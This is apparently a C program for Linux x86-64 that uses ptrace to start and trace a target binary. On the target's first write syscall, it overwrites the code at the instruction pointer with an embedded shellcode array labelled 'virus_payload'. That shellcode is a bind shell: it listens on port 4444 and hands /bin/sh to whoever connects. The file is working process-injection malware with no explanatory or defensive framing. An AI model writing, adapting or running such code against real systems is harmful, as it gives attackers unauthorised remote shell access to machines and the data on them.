#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sched.h>
#include <getopt.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>

char virus_payload[] =
    "\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02"
"\x11\x5c"
"\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05";
 
 
int inject_code(pid_t pid, long address, int size, void *payload);

int main(int argc, char *argv[])
{
	struct user_regs_struct registers;
	pid_t pid = fork();
	
	int status = 0;
	/* Child process */
	if(pid == 0)
	{

		int ret = ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        kill(getpid(), SIGSTOP);
		
		execl(argv[1], argv[1], 0);
	}
	
	else
	{
        wait(&status);
		ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
		while(1)
		{
            ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
            wait(&status);
            ptrace(PTRACE_GETREGS, pid, NULL, &registers);
            if(registers.orig_rax == SYS_write)
            {
                long addr = registers.rip;//rsp-1024;
                inject_code(pid, addr, strlen(virus_payload), (void *)virus_payload);

                registers.rip = addr;//+2;
                printf("[+] RIP now points to 0x%0.16x\n", registers.rip);
                ptrace(PTRACE_SETREGS, pid, 0, &registers);
                ptrace(PTRACE_DETACH, pid, 0, 0);
                break;
            }

                     

           ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        
		}
	}
}

int inject_code(pid_t pid, long address, int size, void *payload)
{
    int i = 0;
    unsigned long curr_payload;
    long tmp_addr;

    while(i < size)
    {
        /* copy 8 bytes of the payload */
        memcpy(&curr_payload, payload, sizeof(long));

        /* Move those 8 bytes into the address we have calculated */
        ptrace(PTRACE_POKETEXT, pid, address, curr_payload);
        i += sizeof(long);
        payload += sizeof(long);
        address += sizeof(long);

    }
    
    return 0;
}



